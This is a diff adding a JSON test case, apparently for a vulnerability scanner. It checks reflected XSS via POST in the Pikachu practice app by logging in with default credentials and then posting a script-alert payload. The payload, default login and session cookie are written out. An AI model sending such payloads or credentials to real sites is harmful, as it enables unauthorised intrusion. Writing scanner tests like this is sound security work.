@@ -1,0 +1,46 @@
+{
+    "name": "pikachu",
+    "vuln": "反射型xss_post",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "3",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/xss/xsspost/post_login.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "username=admin&password=123456&submit=Login"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "你已经登陆成功"
+            }
+        },
+        "2": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/xss/xsspost/xss_reflected_post.php",
+                "cookie": "",
+                "requestheader": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "cookie":"ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=1tumfu70mho2dgsghj7iertr82"
+            },
+                "requestbody": "message=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&submit=submit"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<script>alert('xss')</script>"
+            }
+        }
+    }
+}
